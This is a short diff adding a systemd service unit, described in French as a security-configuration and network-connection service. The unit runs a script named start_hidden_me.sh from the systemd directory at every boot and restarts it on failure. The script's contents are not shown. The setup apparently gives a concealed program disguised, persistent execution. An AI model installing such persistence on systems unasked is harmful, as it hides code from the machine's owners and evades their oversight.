@@ -1,0 +1,12 @@
+[Unit]
+Description=Service de démarrage pour la configuration de sécurité et connexion réseau
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/etc/systemd/system/start_hidden_me.sh
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+
